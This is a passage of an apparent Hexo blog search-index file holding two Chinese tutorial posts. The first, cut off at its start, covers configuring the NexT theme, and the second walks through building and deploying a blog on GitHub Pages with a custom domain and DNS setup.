rel="noopener">在线制作链接</a></strong>。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">favicon:</span> <span class="meta-keyword">/iamges/</span>favicon.ico</span><br></pre></td></tr></table></figure><h3 id="社交"><a href="#社交" class="headerlink" title="社交"></a>社交</h3><p>社交位于站点概览，可以添加GitHub、知乎、微博、豆瓣等社交链接。</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">social</span>:</span><br><span class="line">  <span class="attribute">GitHub</span>: <span class="attribute">https</span>:<span class="comment">//github.com/hywell</span></span><br></pre></td></tr></table></figure><p>社交ico可以在<strong><a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">图标库</a></strong>中查找，通过配置social_icons字段进行定义。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social_icons:</span> </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">github</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d464296fae.png" alt="ico.png"></p><h3 id="打赏"><a href="#打赏" class="headerlink" title="打赏"></a>打赏</h3><p>打赏位于每篇文章底部，可以添加微信、支付宝二维码，并设置感谢语。</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">reward_comment:</span> 感谢语</span><br><span class="line"><span class="symbol">wechatpay:</span> <span class="meta-keyword">/images/</span>wechatpay.jpg</span><br><span class="line"><span class="symbol">alipay:</span> <span class="meta-keyword">/images/</span>alipay.jpg</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d4718784ce.png" alt="reward.png"></p><h3 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h3><p>友情链接位于站点概览，可以设置links标题、友链名称、友链链接等。</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">links_title</span>: 友情链接</span><br><span class="line"><span class="attribute">links</span>:</span><br><span class="line">  <span class="attribute">GitHub</span>: <span class="attribute">https</span>:<span class="comment">//github.com</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d482536a94.png" alt="link.png"></p><h3 id="微信二维码"><a href="#微信二维码" class="headerlink" title="微信二维码"></a>微信二维码</h3><p>微信二维码位于每篇文章底部。有朋自远方来，不亦乐乎！</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">wechat_subscriber:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">qcode:</span> <span class="string">/images/wechat.jpg</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">有朋自远方来,不亦乐乎！</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d4a433d3bd.png" alt="wechat.png"></p><h3 id="版权"><a href="#版权" class="headerlink" title="版权"></a>版权</h3><p>版权信息位于每篇文章底部，表明作者、链接、版权声明。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_copyright:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">3.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/3.0/</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/11/598d4adfbae02.png" alt="post copyright.png"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>通过对以上参数进行配置，相信现在的博客已经开始呈现出一丝丝的与众不同了吧。<br>生命在于折腾，折腾了博客搭建、折腾了博客配置，接下来开始折腾博客美化了。</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建博客</title>
    <url>/archives/5c83b0d3.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>第一次搭建博客，一开始选用GitHub Page + jekyll 从网上找了许多模板，也自己去尝试写，发现总是不如人意。后来，改用GitHub Page + Hexo,套用Next主题满足了折腾的”愿望”。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="Hexo"><a href="#Hexo" class="headerlink" title="Hexo"></a>Hexo</h3><p>安装Hexo需要先安装Nodejs、Git。</p><h4 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h4><p>从Git官网下载对应系统版本进行安装<strong><a href="https://git-scm.com/download/" target="_blank" rel="noopener">Download</a></strong>。我是Windows系统，因此下载Windows版本。<br><img src="https://i.loli.net/2017/08/10/598c23d15d437.png" alt="git.png"><br>打开终端，输入</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">git <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/10/598c23ccbf4de.png" alt="git version.png"><br>查看对应版本，如果成功输出版本信息代表完成安装。</p><h4 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h4><p>从Nodejs官网下载对应系统版本安装<strong><a href="http://nodejs.cn/download/" target="_blank" rel="noopener">Download</a></strong>。我是Windows系统，因此下载Windows版本。<br><img src="https://i.loli.net/2017/08/10/598c23d061640.png" alt="nodejs.png"><br>打开终端，输入</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">npm</span> -v</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/10/598c23cd3982e.png" alt="npm version.png"><br>查看对应版本，如果成功输出版本信息代表完成安装。</p><h4 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h4><p>以<strong>管理员权限</strong>打开终端，进入对应目录（以E:\hexo为例）输入</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">E:</span>\hexo&gt;npm install -g hexo</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2017/08/10/598c23ce1d58b.png" alt="npm install hexo.png"><br>安装途中出现会可能WARN不用担心。</p><h3 id="域名（可选）"><a href="#域名（可选）" class="headerlink" title="域名（可选）"></a>域名（可选）</h3><p>GitHub Page可以通过配置，让其可通过自定义域名进行访问（例如通过iassas.com即可访问我的博客）。<br>建议通过<strong><a href="https://sg.godaddy.com/zh" target="_blank" rel="noopener">GoDaddy</a></strong>申请，输入心仪的域名点击搜索域名。如果域名未被注册，将其添加到购物车。进入购物车进行付款。付款途中根据需要，添加增值服务。<br><img src="https://i.loli.net/2017/08/10/598c2374cb835.png" alt="GoDaddy.png"></p><h3 id="DNS解析（可选）"><a href="#DNS解析（可选）" class="headerlink" title="DNS解析（可选）"></a>DNS解析（可选）</h3><p>为了让博客更好、更快地访问就需要配置DNS。<br>建议通过<strong><a href="https://www.dnspod.cn" target="_blank" rel="noopener">DNSPOD</a></strong>申请，免费注册一个账户之后进入个人管理界面。<br>选择左边菜单栏的[域名解析]，添加一个域名，输入自己的域名（例如iassas.com），点击确定。<br><img src="https://i.loli.net/2017/08/10/598c23d0d4a58.png" alt="DNSPOD.png"><br>点击iassas.com进行配置，点击添加记录，共添加三条记录，添加以下信息进行保存即可。下述第三条www记录中的记录值需要输入对应的github.io（如果没有，请看下一小节）。</p><pre><code>| 主机记录 |记录类型 |线路类型 |  记  录  值   |
| @       | A      |默认    |192.30.252.153 |
| @       | A      |默认    |192.30.252.154 |
| www     | CNAME  |默认    |user.github.io |</code></pre><p>修改域名服务器，以<strong>GoDaddy</strong>结合<strong>DNSPOD</strong>为例。<br>登陆<strong><a href="https://sg.godaddy.com/zh" target="_blank" rel="noopener">GoDaddy</a></strong>，点击我的产品。选择对应的域名，点击DNS。<br><img src="https://i.loli.net/2017/08/10/598c24e3c7de3.png" alt="GoDaddy DNS.png"><br>在域名服务器项中，使用自定义域名服务器。配置如下</p><pre><code>|  域  名  服  务  器  |
|f1g1ns1.dnspod.net   |
|f1g1ns2.dnspod.net   |</code></pre><h3 id="GitHub-Page"><a href="#GitHub-Page" class="headerlink" title="GitHub Page"></a>GitHub Page</h3><p><strong>GitHub Page</strong>需要先注册一个<strong>GitHub</strong>账号<strong><a href="https://www.github.com" target="_blank" rel="noopener">GitHub</a></strong>。<br>进入个人主页（例如<a href="https://github.com/hywell，是我的主页），点击右上角+号，点击New" target="_blank" rel="noopener">https://github.com/hywell，是我的主页），点击右上角+号，点击New</a> repository新建库。<br><img src="https://i.loli.net/2017/08/10/598c23d265662.png" alt="github.png"><br>库名需要以账号名.github.io命名（例如hywell.github.io)，权限选择Public。点击下方Create repository建立库。<br><img src="https://i.loli.net/2017/08/10/598c23d09c1e8.png" alt="github.io.png"></p><h2 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h2><h3 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h3><p>打开终端，输入</p><figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">E:</span>\hexo&gt;hexo init blog</span><br><span class="line"><span class="symbol">E:</span>\hexo&gt;npm install</span><br></pre></td></tr></table></figure><p>成功创建一个站点。<br>进入站点目录，输入清理、编译、本地运行:</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log&gt;hexo clean</span><br><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log&gt;hexo g</span><br><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log&gt;hexo s</span><br></pre></td></tr></table></figure><p>这时候就可以通过浏览器访问127.0.0.1:4000，见证效果了！</p><h3 id="更换主题（可选）"><a href="#更换主题（可选）" class="headerlink" title="更换主题（可选）"></a>更换主题（可选）</h3><p>本博客套用Next主题，也可自行下载别的主题。打开终端，输入</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">E:\hexo\blog&gt;git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/iissnan/hexo-theme-<span class="keyword">next</span> themes/<span class="keyword">next</span></span><br></pre></td></tr></table></figure><h3 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h3><p>博客配置文件有<strong><font color="blue">站点配置文件</font></strong>、<strong><font color="red">主题配置文件</font></strong>。<strong><font color="blue">站点配置文件</font></strong>为博客根目录下的_config.yml文件(E:\hexo\blog\_config.yml)，<strong><font color="red">主题配置文件</font></strong>为\themes\主题_config.yml文件(E:\hexo\blog\themes\next\_config.yml)。<br>需要注意的是在修改配置时，配置值前面需要加一个空格。以<code>配置名: 配置值</code>的形式，例如：<code>title: blog</code>。<br>这里简要的介绍一些配置。</p><h4 id="站点配置"><a href="#站点配置" class="headerlink" title="站点配置"></a>站点配置</h4><p>修改主题，通过修改<strong><font color="blue">站点配置文件</font></strong>的theme字段，将其修改成对应的值 <code>theme: next</code>。<br>修改站点标题，通过修改<strong><font color="blue">站点配置文件</font></strong>的title字段，将其修改成对应的值 <code>title: Blog</code>。<br>修改站点语言，通过修改<strong><font color="blue">站点配置文件</font></strong>的language字段，将其修改成对应的值<code>language: zh-Hans</code>。<br>修改时区，通过修改<strong><font color="blue">站点配置文件</font></strong>的timezone字段，将其修改成对应的值<code>timezone: Asia/Shanghai</code>。</p><h4 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h4><p>修改图标，通过修改<strong><font color="red">主题配置文件</font></strong>的favicon字段，将其修改成对应的值<code>favicon: /images/favicon.ico</code>。<br>这里的路径为/themes/next/source/images/favicon.ico，如果没有对应文件，则需要新建。<br>修改头像，通过修改<strong><font color="red">主题配置文件</font></strong>的avatar，将其修改成对应的值<code>avatar: /upload/avatar.png</code>。这里的路径为/themes/next/source/upload/avatar.png，如果没有对应文件，则需要新建。</p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><h3 id="GitHub部署"><a href="#GitHub部署" class="headerlink" title="GitHub部署"></a>GitHub部署</h3><p>使用GitBash(\Git\git-bash.exe)配置身份信息，在GitBash中输入</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git<span class="built_in"> config </span>--global user.name <span class="string">"yourname"</span></span><br><span class="line">git<span class="built_in"> config </span>--global user.email <span class="string">"youremail"</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">"youremail"</span></span><br></pre></td></tr></table></figure><p>在用户目录下找到.ssh文件夹(C:\user\youname.ssh)，将id_rsa.pub中的密钥复制到<strong><a href="https://github.com/settings/keys" target="_blank" rel="noopener">GitHub-Setting-Key</a></strong>中。<br>点击New SSH key，添加一个新的SSH key：输入任意title、将id_rsa.pub内容粘贴到Key中，最后点击 Add SSH key。<br><img src="https://i.loli.net/2017/08/10/598c2bf90d8dc.png" alt="github ssh key.png"><br>登录<strong><a href="https://www.github.com" target="_blank" rel="noopener">GitHub</a></strong>。对刚刚新建的库（账号名.github.io）进行设置。<br><img src="https://i.loli.net/2017/08/10/598c23cf6f0a7.png" alt="github setting.png"><br>将Custom domain设置为从GoDaddy申请的域名。<br><img src="https://i.loli.net/2017/08/11/598cf827d5b57.png" alt="github custom domaain.png"></p><h3 id="站点部署"><a href="#站点部署" class="headerlink" title="站点部署"></a>站点部署</h3><p>配置<strong><font color="blue">站点配置文件</font></strong>的Deployment字段，将其修改。</p><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:yourname/yourname.github.io.git</span><br><span class="line">  <span class="attribute">branch</span>: master</span><br></pre></td></tr></table></figure><p>如果出现<strong><font color="red">Deployer not found</font></strong>，请输入</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log<span class="symbol">\n</span>pm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>上传blog。</p><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log<span class="symbol">\h</span>exo clean</span><br><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log<span class="symbol">\h</span>exo g</span><br><span class="line">E:<span class="symbol">\h</span>exo<span class="symbol">\b</span>log<span class="symbol">\h</span>exo d</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>这时候通过账户名.github.io 或者 申请的域名即可访问你的博客了！！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
